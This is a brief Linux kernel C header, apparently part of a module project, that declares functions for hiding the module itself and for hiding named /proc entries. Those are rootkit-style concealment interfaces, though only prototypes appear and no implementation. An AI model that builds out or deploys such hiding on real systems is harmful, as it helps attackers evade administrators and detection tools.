/* SPDX-License-Identifier: GPL-2.0 */
#ifndef KFI_VISIBILITY_H
#define KFI_VISIBILITY_H

#include <linux/types.h>

int kfi_visibility_hide_module(void);
u64 kfi_visibility_capabilities(void);
int kfi_visibility_proc_hide_start(const char *name);
void kfi_visibility_proc_hide_stop(void);
bool kfi_visibility_proc_hide_active(void);

#endif
